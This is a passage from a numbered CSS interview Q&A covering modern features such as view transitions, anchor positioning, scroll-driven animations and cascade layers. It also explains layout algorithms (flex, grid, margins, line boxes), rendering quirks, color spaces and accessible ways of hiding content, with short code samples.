- If the LCP element is a CSS `background-image`, the browser only finds the image after it parses the CSS and matches the rule. That's later than an `<img>` in the HTML. Fix it with `<link rel="preload" as="image" fetchpriority="high">` or by using an `<img>`.
- Fonts with `font-display: block` hide LCP text until they load.
- Hiding content until JavaScript runs (like `opacity: 0` with an animation on load) pushes LCP back.

### 316: How do you load fonts as fast as possible?

1. Self-host WOFF2 files on your own domain. This avoids an extra DNS and TLS connection to a font CDN.
2. Subset fonts to the characters you need, with `unicode-range` for the different language sets.
3. Preload one or two critical font files (always with `crossorigin`).
4. Use a variable font if you need many weights.
5. Use `font-display: swap` or `optional`, and adjust the fallback font's metrics.
6. Cache font files for a long time with a hashed filename.

```css
@font-face {
  font-family: "Inter";
  src: url("/fonts/inter-latin.woff2") format("woff2");
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+2000-206F;
  font-display: swap;
}
```

The browser only downloads a `unicode-range` file if the page uses characters in that range.

### 317: Can `:has()` hurt performance?

It can, depending on how you use it. When the DOM changes, the browser has to work out which elements' `:has()` result might have changed. Engines optimise common cases, but some patterns are expensive:

- Very broad anchors, like `body:has(...)`, `:root:has(...)` or `*:has(...)`, on pages that change the DOM often.
- `:has()` with descendant selectors deep inside a large subtree, like `.list:has(.item:hover)` on a list of thousands.
- Nested complexity like `:has(~ .x:has(.y))`.

Keep the anchor element as specific and close to the target as you can, prefer the child (`>`) or sibling combinators inside `:has()`, and measure "Recalculate Style" in the Performance panel.

### 318: Why do some CSS animations jank even when they use `transform`?

- The element isn't on its own layer yet. The browser promotes it when the animation starts, which can cause a hitch on the first frame.
- Other main-thread work is blocking. A transform animation on the compositor keeps running, but if the browser can't run it on the compositor (for example, because of some filters, or animating a property together with a layout property), it falls back to the main thread.
- The layer is huge, so raster or upload is slow.
- Too many layers, or memory pressure on mobile.
- Animating `transform` from JavaScript with `requestAnimationFrame` puts it back on the main thread. Use CSS animations or the Web Animations API instead.

Use the Performance panel and look for frames that took too long and "Animation" tracks marked as not composited.

### 319: What are scroll-driven animations?

They connect a CSS animation to scroll position instead of time, with no JavaScript.

```css
/* reading progress bar */
.progress {
  position: fixed;
  top: 0;
  left: 0;
  height: 4px;
  width: 100%;
  background: #4f46e5;
  transform-origin: left;
  animation: grow linear;
  animation-timeline: scroll(root block);
}
@keyframes grow {
  from {
    scale: 0 1;
  }
  to {
    scale: 1 1;
  }
}
```

`scroll()` tracks how far a scroll container has been scrolled. `view()` tracks an element's progress through the visible area. They work in Chromium and Safari 26. Firefox support has been in progress, and it's part of Interop 2026. Wrap them in `@supports (animation-timeline: scroll())`.

### 320: How do view timelines and animation ranges work?

`view()` follows an element as it crosses the visible part of its scroll container. `animation-range` picks which part of that crossing runs the animation.

```css
.reveal {
  animation: fade-up linear both;
  animation-timeline: view();
  animation-range: entry 0% cover 30%;
}
@keyframes fade-up {
  from {
    opacity: 0;
    translate: 0 2rem;
  }
  to {
    opacity: 1;
    translate: 0 0;
  }
}
```

Range names: `cover` (from first entering to fully leaving), `contain`, `entry`, `exit`, `entry-crossing` and `exit-crossing`. Named timelines (`view-timeline-name`, `timeline-scope`) let one element's scroll progress drive an animation on another element.

### 321: What is the View Transitions API?

It animates between two states of the page. The browser takes a snapshot of the old state, you update the DOM, and the browser animates from the snapshot to the new state. The default animation is a crossfade.

```js
function navigate(update) {
  if (!document.startViewTransition) return update();
  document.startViewTransition(() => update());
}
```

```css
::view-transition-old(root),
::view-transition-new(root) {
  animation-duration: 250ms;
}
```

Same-document view transitions are Baseline since late 2025. React, Next.js, Astro and other frameworks have built-in support.

### 322: How does `view-transition-name` work, and what does the pseudo-element tree look like?

Elements with a unique `view-transition-name` are captured on their own, and the browser animates their position and size between the old and new states. That's how you get "shared element" transitions, like a thumbnail growing into a hero image.

```css
.product-thumb {
  view-transition-name: product-42;
}
/* on the next page or state: */
.product-hero {
  view-transition-name: product-42;
}
```

During the transition the browser builds this tree in the top layer:

```
::view-transition
└─ ::view-transition-group(product-42)
   └─ ::view-transition-image-pair(product-42)
      ├─ ::view-transition-old(product-42)
      └─ ::view-transition-new(product-42)
```

Names must be unique on the page at capture time. `view-transition-name: match-element` (newer) gives each element an automatic name, which helps with lists. `view-transition-class` lets you style many groups with one rule.

### 323: How do cross-document view transitions work?

For normal multi-page navigation on the same origin, both pages opt in with CSS:

```css
@view-transition {
  navigation: auto;
}
```

The browser captures the old page, loads the new one, and animates between them. No JavaScript or SPA router is needed. The `pageswap` and `pagereveal` events let you change the transition, for example to set names based on which link was clicked. It works in Chromium and Safari 18.2+, and Firefox is working on it as part of Interop 2026.

### 324: What are view transition types?

Types let you run different animations for the same transition depending on context, like "forward" and "back" navigation.

```js
document.startViewTransition({
  update: () => renderNextPage(),
  types: ["slide-left"],
});
```

```css
html:active-view-transition-type(slide-left) {
  &::view-transition-old(root) {
    animation: slide-out-left 300ms;
  }
  &::view-transition-new(root) {
    animation: slide-in-right 300ms;
  }
}
```

For cross-document transitions, types are set in `@view-transition { types: ... }` or from the `pagereveal` event.

### 325: What is CSS anchor positioning?

It lets you position an element relative to another element (the anchor) anywhere on the page, with no JavaScript like Popper or Floating UI.

```css
.trigger {
  anchor-name: --menu-btn;
}
.menu {
  position: absolute;
  position-anchor: --menu-btn;
  top: anchor(bottom);
  left: anchor(left);
  margin-top: 4px;
}
```

`anchor()` returns the position of an edge of the anchor. It works in Chromium (since 125) and Safari 26, and Firefox shipped it more recently. It's an Interop focus area, so cross-browser support is growing.

### 326: How do anchor positioning fallbacks work?

If the positioned element would overflow the viewport, the browser can try other positions.

```css
.tooltip {
  position: absolute;
  position-anchor: --btn;
  position-area: top;
  position-try-fallbacks: flip-block, flip-inline, bottom;
}

/* custom fallback */
@position-try --right-side {
  position-area: right;
  margin-left: 8px;
}
.tooltip {
  position-try-fallbacks: flip-block, --right-side;
}
```

`flip-block` and `flip-inline` mirror the position. `position-try-order: most-height` picks the option with the most room. `position-visibility: anchors-hidden` hides the element when its anchor scrolls out of view.

### 327: What do `position-area` and `anchor-size()` do?

`position-area` places an element in a 3×3 grid around its anchor, using keywords instead of `anchor()` math.

```css
.menu {
  position-anchor: --btn;
  position-area: bottom span-right; /* below, starting at the anchor's left edge */
}
.dropdown {
  width: anchor-size(width); /* as wide as the button */
  min-width: max-content;
}
```

`anchor-size()` reads the anchor's width or height. It's how you make a select-style dropdown match its trigger's width.

### 328: How do you build a tooltip with popover and anchor positioning, without JavaScript?

```html
<button popovertarget="tip" style="anchor-name: --tip-anchor">?</button>
<div id="tip" popover="hint">Helpful text</div>
```

```css
#tip {
  position-anchor: --tip-anchor;
  position-area: top;
  position-try-fallbacks: flip-block;
  margin: 0 0 6px;
  inset: auto; /* clear the default popover centering */
}
```

The popover handles showing and hiding, the top layer, light dismiss (closing on outside click or Escape) and keyboard support. Anchor positioning places it. `popover="hint"` (newer, Chromium) lets a hint open without closing other open popovers. Newer Chromium versions also treat the button that opened a popover as its implicit anchor, so there you may not need `anchor-name` at all.

### 329: What is the customizable `<select>`?

Chromium (since 135) lets you fully style a native `<select>` by opting in with `appearance: base-select`. You can then style the button, the dropdown (`::picker(select)`), options, the check mark (`::checkmark`) and the arrow (`::picker-icon`), and even put rich HTML inside `<option>`.

```css
select,
::picker(select) {
  appearance: base-select;
}
::picker(select) {
  border-radius: 8px;
  box-shadow: 0 8px 24px rgb(0 0 0 / 15%);
}
option:checked {
  font-weight: bold;
}
```

Browsers that don't support it show the normal native select, so it's safe to add now. The dropdown uses the top layer and anchor positioning internally.

### 330: What is the CSS `if()` function?

`if()` picks a value inline based on a condition: `style()`, `media()` or `supports()`.

```css
.button {
  background: if(
    style(--variant: danger): crimson; style(--variant: ghost): transparent;
      else: royalblue
  );
  padding: if(media(width < 600px): 0.5rem; else: 1rem);
}
```

It shipped in Chromium 137 and isn't in Firefox or Safari yet (late 2026). Always provide a normal fallback declaration before it.

### 331: What are `sibling-index()` and `sibling-count()`?

They return an element's position among its siblings and the total number of siblings, as numbers you can use in `calc()`.

```css
.list > li {
  transition-delay: calc(
    (sibling-index() - 1) * 50ms
  ); /* staggered animation */
}
.fan > .card {
  rotate: calc((sibling-index() - (sibling-count() + 1) / 2) * 5deg);
}
```

Before these existed, you had to set `--i` on each item from HTML or JavaScript. They shipped in Chromium 138, and the other engines have been adding them. Check current support.

### 332: What is the typed `attr()` function?

The new `attr()` can read an attribute as a specific type and use it in any property, not only in `content`.

```css
.bar {
  width: attr(data-value type(<percentage>), 0%);
}
.swatch {
  background: attr(data-color type(<color>), gray);
}
```

```html
<div class="bar" data-value="72%"></div>
```

The second argument is a fallback. It's in Chromium (since 133) and is an Interop 2026 focus area, so support elsewhere is still on the way.

### 333: What are CSS custom functions (`@function`)?

`@function` lets you define reusable functions in plain CSS that return a value.

```css
@function --fluid(--min, --max) {
  result: clamp(var(--min), calc(var(--min) + 2vw), var(--max));
}

h1 {
  font-size: --fluid(2rem, 3.5rem);
}
```

It's very new: only in Chromium so far. For production code, Sass functions or plain `clamp()` are still the safe choice.

### 334: What do `calc-size()` and `interpolate-size` do?

They let you do math with and animate to intrinsic sizes like `auto`, `min-content` and `fit-content`.

```css
:root {
  interpolate-size: allow-keywords;
} /* opt in once for the page */

.panel {
  height: 0;
  overflow: clip;
  transition: height 300ms;
}
.panel.open {
  height: auto;
}

.drawer.open {
  height: calc-size(auto, size + 2rem);
}
```

`interpolate-size` is opt-in because it could change the behavior of existing sites. Both are Chromium-only for now. Other browsers just jump to the final size.

### 335: What math functions does CSS have besides `calc()`?

- `round()`, `mod()`, `rem()`: rounding and remainders.
- `abs()`, `sign()`.
- `sin()`, `cos()`, `tan()`, `asin()`, `acos()`, `atan()`, `atan2()`: trigonometry.
- `pow()`, `sqrt()`, `hypot()`, `log()`, `exp()`.

```css
/* place 8 items on a circle */
.item {
  --angle: calc(360deg / 8 * var(--i));
  translate: calc(cos(var(--angle)) * 120px) calc(sin(var(--angle)) * 120px);
}

/* snap a fluid size to a 4px grid */
.box {
  width: round(nearest, 33vw, 4px);
}
```

Trig and rounding functions are Baseline (2023-2024).

### 336: When should a registered custom property use `inherits: false`?

When the value is only meant for the element itself, like a per-element animation value (`--angle`, `--progress`). There are two reasons:

1. **Correctness**: children don't pick up the value by accident.
2. **Performance**: when an inherited custom property changes on a high-level element (like `:root`), the browser has to recalculate styles for the whole subtree. If it doesn't inherit, only that element is updated. This matters most when you animate a variable or update it from JavaScript every frame.

### 337: What happens with circular custom property references?

If custom properties depend on each other in a loop, every property in the loop becomes "guaranteed-invalid" at computed-value time. Properties that use them fall back to their `var()` fallback, or become `unset`.

```css
.box {
  --a: var(--b);
  --b: var(--a);
  color: var(--a, red); /* red */
}
```

Also, `var()` substitution is done on tokens, not values. `--x: 10px; width: calc(var(--x) * 2)` works, but `--x: 10; width: var(--x)px` doesn't, because it becomes the two tokens `10` and `px`. Use `calc(var(--x) * 1px)` instead.

### 338: How would you design a cascade layer setup for a large app?

```css
@layer reset, tokens, base, vendor, layouts, components, variants, utilities, overrides;
```

- **reset**: box-sizing and margin resets.
- **tokens**: custom properties for colors, spacing and type.
- **base**: element styles (`body`, `a`, `h1`).
- **vendor**: third-party CSS, loaded with `@import ... layer(vendor)`.
- **layouts**: page grids, stack and cluster patterns.
- **components**: buttons, cards. Each component can have a sub-layer.
- **variants** and **utilities**: should always win over components.
- **overrides**: rare, page-level fixes.

Declare the order in one statement that loads first. Keep unlayered CSS to a minimum, because it beats every layer, and use it only for intentional emergency fixes. This removes most specificity fights and makes the order of CSS files in bundles matter much less.

### 339: How does scoping proximity work in `@scope`?

When two declarations come from scoped rules with the same specificity and the same layer, the one whose scope root is **closer** in the DOM wins, no matter the source order.

```css
@scope (.light) {
  p {
    color: black;
  }
}
@scope (.dark) {
  p {
    color: white;
  }
}
```

```html
<div class="dark">
  <div class="light">
    <p>Black, because .light is the closer scope root</p>
  </div>
</div>
```

Without `@scope`, the rule that comes later (`.dark`) would win. Proximity is checked after specificity, so a more specific selector still wins.

### 340: What is a "donut scope" and when do you need it?

A donut scope styles a component but stops at certain inner parts, like slots where other components or user content go.

```css
@scope (.card) to (.card__content) {
  a {
    color: var(--card-link);
  }
  img {
    border-radius: 8px;
  }
}
```

Links and images inside `.card__content` aren't affected. Before `@scope`, you needed long `:not()` chains or strict BEM to keep a component's styles from leaking into nested content.

### 341: How do styles cross the Shadow DOM boundary?

- **Inherited properties** (`color`, `font`, `line-height`, `direction` and so on) pass down into the shadow tree from the host.
- **Custom properties** inherit too, which is the main way to theme components.
- **Non-inherited properties** don't cross, and page selectors can't match shadow content.
- `::part()` lets outside CSS style parts the component exposes. `exportparts` passes parts from nested components up.
- `:host-context()` (limited support) lets a component react to an ancestor outside.
- `all: initial` on `:host` cuts off inherited values if the component wants full isolation.

Global resets like `* { box-sizing: border-box }` don't apply inside shadow roots. Each component has to include its own.

### 342: What are constructable stylesheets?

They are `CSSStyleSheet` objects you create in JavaScript and share between documents and shadow roots with `adoptedStyleSheets`.

```js
const sheet = new CSSStyleSheet();
sheet.replaceSync(`:host { display: block; } .title { font-weight: 600; }`);

class MyCard extends HTMLElement {
  constructor() {
    super();
    const root = this.attachShadow({ mode: "open" });
    root.adoptedStyleSheets = [sheet];
  }
}
```

The browser parses the stylesheet once and shares it, instead of parsing a `<style>` block in every instance. With CSS module scripts (`import sheet from "./card.css" with { type: "css" }`), you can import a CSS file straight as a `CSSStyleSheet`. That's supported in Chromium, Safari and recent Firefox.

### 343: What is CSS Houdini?

Houdini is a set of low-level APIs that open up parts of the CSS engine to developers:

- **Properties and Values API**: `@property` / `CSS.registerProperty()`. Widely supported.
- **Typed OM**: `element.attributeStyleMap` and `CSS.px(10)`. Works with typed values instead of strings. Support isn't complete.
- **Paint API**: `paint()` worklets that draw backgrounds with canvas-like code. Chromium only.
- **Layout API** and **Animation Worklet**: experimental and mostly stalled.

In practice, `@property` is the part that made it into everyday use. The rest has limited support.

### 344: Why is `getComputedStyle` sometimes slow?

It returns up-to-date values. If styles or layout are dirty (something changed since the last calculation), calling it forces the browser to recalculate styles, and for layout values like `width` it forces layout too. Calling it in a loop, mixed with style writes, causes layout thrashing.

Read all the values you need in one batch before any writes. Cache values that don't change. Use `ResizeObserver` or `IntersectionObserver` instead of measuring in scroll or resize handlers.

### 345: Why do runtime CSS-in-JS libraries hurt performance?

On render they serialize styles, hash them, and insert rules into a stylesheet. Inserting rules makes the browser recalculate styles. In React concurrent rendering, inserting during render can happen many times and cause extra style recalculations. That's why React added `useInsertionEffect` for these libraries. They also add bundle size, hydration cost, and don't work well with Server Components, where there is no client runtime.

This is why newer projects pick CSS Modules, Tailwind, or zero-runtime libraries that output static CSS at build time.

### 346: How do zero-runtime CSS-in-JS libraries work?

They let you write styles in TypeScript or JavaScript, but a compiler pulls them out into static `.css` files at build time and swaps the style objects for class names.

```ts
// styles.css.ts (vanilla-extract)
import { style } from "@vanilla-extract/css";

export const button = style({
  padding: "0.5rem 1rem",
  borderRadius: 8,
  ":hover": { opacity: 0.9 },
});
```

You keep type safety, co-location and scoping, with no runtime cost. The trade-off is that truly dynamic values must go through CSS custom properties. Examples: vanilla-extract, Linaria, Panda CSS and StyleX (Meta's atomic CSS compiler).

### 347: What are the trade-offs of atomic CSS?

Atomic CSS means one class per declaration (`.p-4 { padding: 1rem }`), as in Tailwind and StyleX.

**Pros:** CSS size stops growing as the app grows, because classes are reused. It caches well, specificity is flat, there's no dead CSS per component, and changes stay local.

**Cons:** bigger HTML (often fixed by compression), harder-to-read markup, the need for tooling to handle conflicts (for example `tailwind-merge`, or StyleX's "last style wins" rule), and debugging in DevTools shows many tiny rules.

### 348: How would you structure design tokens in CSS?

Use layers of tokens:

```css
:root {
  /* primitive tokens: raw values */
  --blue-500: oklch(58% 0.2 260);
  --gray-900: oklch(20% 0.01 260);
  --space-4: 1rem;

  /* semantic tokens: meaning */
  --color-action: var(--blue-500);
  --color-text: var(--gray-900);
  --space-component: var(--space-4);
}

/* component tokens: optional, a public API for one component */
.button {
  --button-bg: var(--color-action);
  background: var(--button-bg);
  padding: var(--space-component);
}
```

Components only use semantic or component tokens. Themes and brands only change the semantic layer. Tokens are often stored as JSON (the W3C Design Tokens format) and turned into CSS, iOS and Android values with tools like Style Dictionary.

### 349: How would you support several brands in one codebase?

- Keep one set of components that only use semantic tokens.
- Put each brand's values in its own token file, scoped to a selector like `[data-brand="acme"]`, or loaded as a separate stylesheet.
- Combine brand with theme: `[data-brand="acme"][data-theme="dark"]`, or use `light-dark()` in each brand's tokens.
- Use `color-mix()` or relative colors to generate hover and disabled states from one brand color, so each brand only needs a few base values.
- Test visually per brand (Storybook plus screenshot tests), because token mistakes don't show up as CSS errors.

### 350: How do you prevent a flash of the wrong theme with server rendering?

The server doesn't know the user's saved theme (it's in `localStorage`), so the first HTML may render in the wrong theme.

1. Store the preference in a **cookie** as well, so the server can render the right `data-theme` on `<html>`.
2. Or run a tiny **blocking inline script** in `<head>` that reads `localStorage` and sets the attribute before the first paint:

```html
<script>
  try {
    const t = localStorage.getItem("theme");
    if (t) document.documentElement.dataset.theme = t;
  } catch {}
</script>
```

3. Use `color-scheme` and `light-dark()` so the default follows the OS with no JavaScript.
4. In React, add `suppressHydrationWarning` on `<html>` because the attribute differs between server and client.

### 351: What causes a flash of unstyled content (FOUC)?

FOUC happens when HTML is painted before the CSS that styles it has loaded. Common causes:

- CSS loaded with JavaScript (runtime CSS-in-JS, or injecting styles after hydration).
- Stylesheets placed at the end of `<body>`, or loaded asynchronously without critical CSS.
- Code-split CSS chunks that load after the JS chunk that renders the component.
- Web components that render before their styles are attached.
- Server-rendered HTML whose CSS isn't included in the response.

Fixes: put critical CSS in `<link>` tags in `<head>`, extract CSS at build time, and make sure frameworks collect and emit the styles for each route during server rendering.

### 352: How does CSS ordering break when you code-split?

With code splitting, CSS for each chunk loads when the chunk loads. The order of the CSS in the document now depends on navigation order, not on source order. If two chunks have rules with the same specificity for the same element, the winner can change depending on which page the user visited first.

Fixes:

- Avoid same-specificity conflicts between modules. Each component should only style its own classes.
- Use cascade layers, so the order of layers decides priority and load order doesn't matter.
- Keep global or base CSS in one entry chunk that always loads first.

### 353: How do you stop CSS from leaking between micro-frontends?

Each micro-frontend is built by a different team, so global selectors and different versions of the same library can clash.

- **Scope everything**: CSS Modules, prefixed class names (`.checkout-*`), or `@scope`.
- **Shadow DOM**: wrap each micro-frontend in a custom element with its own shadow root for real isolation.
- **Cascade layers per team**: the shell declares the layer order and each app puts its CSS in its own layer.
- **No global resets** inside micro-frontends. Only the shell owns the reset and the base styles.
- **Share design tokens** as custom properties from the shell, so the apps look the same without sharing CSS files.

### 354: A modal opens below the sticky header. Walk through how you'd fix it.

1. Check where the modal lives in the DOM. If it's inside a component tree with `transform`, `filter`, `isolation`, or a `z-index` + `position` ancestor, it's trapped in that ancestor's stacking context.
2. Compare the stacking contexts. If the header has `z-index: 100` at the root level and the modal's ancestor has `z-index: 1`, the modal can't go above the header, whatever its own `z-index` is.
3. Options, from best to worst:
   - Use `<dialog>` with `showModal()`, which puts it in the top layer above everything.
   - Render the modal in a portal at the end of `body`.
   - Remove the property that creates the extra stacking context, or raise that ancestor's `z-index`.

### 355: What is the top layer and why does it help with `z-index` problems?

The top layer is a special rendering layer above the whole document. Elements in it aren't affected by ancestors' `z-index`, `overflow` or stacking contexts. Elements get there through:

- `dialog.showModal()`
- The `popover` attribute when shown
- The Fullscreen API

Within the top layer, the most recently added element is on top. You can't add an element to it with CSS alone, and `z-index` has no effect there. That makes dropdowns inside `overflow: hidden` containers and modals inside transformed parents simple to handle.

### 356: What makes an element the containing block for `position: fixed` children?

An ancestor becomes the containing block for fixed descendants (instead of the viewport) if it has:

- `transform`, `translate`, `rotate`, `scale` or `perspective` other than `none`
- `filter` or `backdrop-filter` other than `none`
- `contain: layout`, `paint`, `strict` or `content`
- `container-type` other than `normal`
- `will-change` naming any of the above
- `content-visibility: auto`

This catches people out when a parent gets `backdrop-filter` for a glass effect and a fixed child inside suddenly moves with it. Moving the fixed element out of the ancestor, or using the top layer, fixes it.

### 357: How are percentage heights worked out?

A percentage `height` is based on the containing block's height, but only if that height is **definite**. A height is definite if:

- It's set to a length, or a percentage of a definite height.
- The element is absolutely positioned with both `top` and `bottom` set.
- It's a stretched flex item in a container with a definite height.
- It's a grid item, whose track size counts as definite.

If the height isn't definite, the percentage acts like `auto`. This is why `height: 100%` works inside grid cells but not inside a normal `div` with `height: auto`. The `min-height` of the parent doesn't make its height definite, which is a common gotcha.

### 358: What is a min-content contribution, and why does it matter?

Every box has a **min-content contribution**: the smallest size it can be without overflowing, counting its margins, borders and padding. Flex and grid use these values to decide how small items can go.

A single long word, a large image, a `<pre>` block or a table with a set width makes the min-content contribution big. A grid track with an `auto` minimum, or a flex item with `min-width: auto`, then refuses to shrink below it. That's what causes the "my 1fr column is wider than the others" and "my flex child overflows" bugs. The fixes are `minmax(0, 1fr)`, `min-width: 0` and `overflow-wrap: anywhere`.

### 359: Can you describe the flexbox sizing algorithm in simple steps?

1. Work out each item's **flex base size** from `flex-basis` (or `width`/`height` if the basis is `auto`, or the content size if both are `auto`).
2. Collect items into lines (one line, or several if `flex-wrap` is on).
3. For each line, compare the total base sizes to the container size, which gives free space (positive or negative).
4. If there's positive space, share it by `flex-grow`. If negative, shrink by `flex-shrink × base size`.
5. Clamp each item to its `min-*` and `max-*` sizes. If an item is clamped, freeze it and share the remaining space again among the other items.
6. Work out cross sizes, then apply `justify-content`, `align-items`, `align-self` and auto margins.

### 360: How does `min-width: auto` work for flex items exactly?

For a flex item that isn't a scroll container (`overflow: visible`), `min-width: auto` (in a row) works out to the smaller of:

- the content-based minimum (min-content size), and
- the set `width` or `flex-basis`, if it has one (and the item's aspect ratio, for replaced elements).

So a flex item won't shrink below its content even if `flex-shrink: 1` and the content overflows. When the item is a scroll container (`overflow: hidden` or `auto`), the automatic minimum becomes 0. That's why setting `overflow: hidden` also "fixes" the problem.

### 361: Can you describe how grid tracks are sized?

In simple terms:

1. Fixed tracks (`200px`) get their size.
2. For tracks with intrinsic sizes (`auto`, `min-content`, `max-content`, and the `auto` minimum of `1fr`), the browser looks at the items in each track and grows the track to fit their contributions. Items that span one track are handled first, then items that span more tracks.
3. Any space left is used to grow tracks up to their maximums.
4. `fr` tracks share what's left in proportion to their flex factors. A track never gets less than its base size from step 2.
5. Finally, `auto` tracks are stretched if `justify-content`/`align-content` is `normal` or `stretch`.

Spanning items over `fr` tracks and the `auto` minimums are where most surprises come from.

### 362: How does `fr` share space when content is bigger than the share?

`1fr` is `minmax(auto, 1fr)`. If one column's content needs 400px and the others need 50px in a 600px container with `1fr 1fr 1fr`, the browser can't give each 200px. The first column keeps its 400px minimum, and the other two share the rest (100px each).

With `minmax(0, 1fr)`, all three columns are 200px each, and the content in the first one overflows or wraps. Choose based on what should give way: the layout or the content.

### 363: What are some details of subgrid that people miss?

- A subgrid uses the parent's tracks in the subgridded axis, so its items line up with items in sibling subgrids.
- It inherits the parent's `gap`, but can set its own, which is applied by shrinking the inner items, not the tracks.
- Line names from the parent come down. The subgrid can add its own: `grid-template-columns: subgrid [a] [b]`.
- It must span the tracks it wants to use: `grid-row: span 3; grid-template-rows: subgrid;`.
- An implicit grid isn't created in a subgridded axis. Extra items are placed in the last track.
- Subgrid content takes part in the parent's track sizing, so a tall title in one card makes the title row taller in all cards. That's usually the point.

### 364: Is there a performance difference between grid and flexbox for large lists?

For normal page sizes, no. For very large layouts (thousands of items), grid track sizing that depends on content (`auto`, `max-content`, `auto-fill` with `minmax`) can be more expensive. Every item can affect every track, so the browser has to measure everything. Flexbox with fixed `flex-basis`, or grid with fixed tracks, is cheaper.

For long lists the real answer is virtualization (rendering only the visible items) or `content-visibility: auto`, not picking between grid and flex.

### 365: What are the tricky margin collapsing cases?

- **Parent and first/last child**: a child's top margin escapes through the parent if the parent has no top border, padding, inline content or BFC. The parent seems to have the margin.
- **Empty blocks**: an element with no height, padding, border or content has its own top and bottom margins collapse into one.
- **Negative margins**: the result is the largest positive margin plus the most negative margin. `30px` and `-10px` give `20px`.
- **Several margins**: three or more margins that touch all collapse together.
- **No collapse** for flex and grid items, floats, absolutely positioned elements, inline-blocks, or across a BFC boundary.

### 366: What is an inline formatting context and a line box?

Inside a block, inline content (text, inline elements, inline-blocks) is laid out in **line boxes**, one per line. A line box's height is set by the tallest inline box on that line, after `vertical-align`. There's also an invisible "strut" with the parent's font and `line-height`, which is why an empty line or a lone image still takes up a full line of height.

This explains several bugs: the gap under images, inline-blocks of different heights lining up oddly, and a small icon making a line taller than expected.

### 367: Why do inline-blocks with different content not line up at the top?

Inline-blocks line up on their **baseline**, which is the baseline of their last line of text. An inline-block with no in-flow line boxes, or with `overflow` other than `visible`, uses its bottom margin edge as its baseline instead. Boxes with different amounts of text, or one with `overflow: hidden`, end up at different heights.

Fix it with `vertical-align: top` on the inline-blocks, or better, switch to flexbox or grid.

### 368: What does `text-box` (`text-box-trim`) do?

Fonts add extra space above capital letters and below the baseline, so text inside a button never looks quite centered, and spacing between headings and boxes looks uneven. `text-box` trims that space to the actual letter edges.

```css
.button,
h1 {
  text-box: trim-both cap alphabetic;
}
```

`trim-both` trims the top and the bottom. `cap alphabetic` means trim to the top of capital letters and to the alphabetic baseline. It's in Chromium and Safari. Firefox doesn't have it yet, so unsupported browsers just keep the default spacing.

### 369: Why doesn't text look vertically centered even with flexbox?

Flexbox centers the **line box**, not the visible letters. Font metrics (ascent and descent) add different amounts of space above and below the glyphs, and every font is different. In a button, text often looks a pixel or two too high or too low.

Fixes: `text-box: trim-both cap alphabetic` where it's supported, tweaking padding by hand for the specific font, or tools like Capsize that work out the trim from font metrics.

### 370: What happens with sub-pixel values?

Layout uses fractional values (like `33.333px`), but the final pixels on screen are whole device pixels. Browsers snap borders and edges to pixels in different ways, which can cause:

- 1px gaps or overlaps between items in percentage layouts.
- Blurry text or borders when an element sits at a half-pixel position after `translate(-50%, -50%)`.
- Lines that look 1px thick in one place and 2px in another.

Fixes: use grid or flex `gap` instead of percentage widths, avoid centering with `translate` when you can, and use `round()` to snap values to whole pixels.

### 371: How do you draw a true 1px hairline on high-DPI screens?

`1px` in CSS is several device pixels on a retina screen. For a single-device-pixel line:

```css
.hairline {
  border-bottom: 1px solid #ddd;
}

@media (min-resolution: 2dppx) {
  .hairline {
    border-bottom-width: 0.5px;
  }
}
```

Safari and Chromium draw `0.5px` borders on 2x screens. Another option is a `::after` element scaled with `scale: 1 0.5`. Ask whether it's needed: most designs look fine with a lighter color at 1px.

### 372: Why does text look blurry after a transform?

When an element is moved by a fractional amount, or scaled, the browser may rasterize it as a bitmap layer and then move the bitmap. Text in that layer can look soft:

- `translate(-50%, -50%)` on an element with an odd width puts it at a half pixel.
- `scale()` animations: the layer is drawn at one size and scaled on the GPU.
- `will-change: transform` can keep a layer at a fixed raster scale.

Fixes: avoid half-pixel offsets (use `inset: 0; margin: auto`, or grid centering), remove `will-change` after animations, and let the element settle at `transform: none` at the end.

### 373: What was the `translateZ(0)` hack, and should you still use it?

`transform: translateZ(0)` or `backface-visibility: hidden` was used to force an element onto its own GPU layer. People did it to smooth animations or fix flickering, mostly in old WebKit.

Today it's legacy. Use `will-change: transform` if you really need early promotion, and only for elements that will animate. Forcing layers everywhere wastes memory and can also blur text and create unwanted stacking contexts.

### 374: What does `in oklch` mean in a gradient?

Gradients and `color-mix()` blend colors in a color space. The default for gradients is sRGB, which can make a muddy gray band in the middle, for example between blue and yellow. You can choose another space:

```css
.a {
  background: linear-gradient(in oklch, blue, yellow);
}
.b {
  background: linear-gradient(in oklch longer hue, red, red);
} /* rainbow */
.c {
  background: linear-gradient(in srgb-linear, black, white);
}
```

`oklab` and `oklch` give smooth and bright blends. The hue options (`shorter`, `longer`, `increasing`, `decreasing`) set which way around the color wheel the hue goes.

### 375: What is gamut mapping?

When you use a color the screen can't show, like a very bright `oklch` color or a P3 color on an sRGB monitor, the browser has to map it to the closest color it can show. The spec says to keep lightness and hue and reduce chroma until the color fits, so it looks "less saturated but the same color". Older approaches simply clipped each RGB channel, which can change the hue.

For designers, this means you can write wide-gamut colors and trust that older screens get something reasonable. Still check important brand colors on an sRGB screen.

### 376: How do you design for forced colors mode in depth?

In forced colors mode, the browser replaces colors with **system colors**: `Canvas`, `CanvasText`, `LinkText`, `ButtonFace`, `ButtonText`, `Highlight`, `HighlightText`, `GrayText`, and others.

```css
@media (forced-colors: active) {
  .card {
    border: 1px solid CanvasText;
  } /* keep edges */
  .badge {
    forced-color-adjust: none;
  } /* keep brand color, check contrast yourself */
  .icon {
    fill: CanvasText;
  } /* SVG that uses fixed colors */
  .button:focus-visible {
    outline: 2px solid Highlight;
  }
  .selected {
    background: Highlight;
    color: HighlightText;
  }
}
```

Things to know: `box-shadow` and background images that carry meaning are removed, `transparent` borders become visible (a trick for adding edges only in this mode), and `forced-color-adjust: none` opts an element out. Use that rarely.

### 377: What is the accessibility impact of different ways of hiding content?

| Method                                  | Visible            | In accessibility tree | Focusable |
| --------------------------------------- | ------------------ | --------------------- | --------- |
| `display: none` / `hidden` attribute    | No                 | No                    | No        |
| `visibility: hidden`                    | No                 | No                    | No        |
| `.sr-only` (clip pattern)               | No                 | Yes                   | Yes       |
| `opacity: 0`                            | No                 | Yes                   | Yes       |
| `inert` attribute                       | Yes                | No                    | No        |
| `content-visibility: hidden`            | No                 | No                    | No        |
| `content-visibility: auto` (off-screen) | Skipped for render | Yes                   | Yes       |

A common bug is `opacity: 0` on closed menus. Screen reader and keyboard users can still reach invisible links. Pair it with `visibility: hidden` (which can be transitioned) or use `inert`.

### 378: How can CSS help manage focus and keyboard use?

- `:focus-visible` for keyboard-only focus rings.
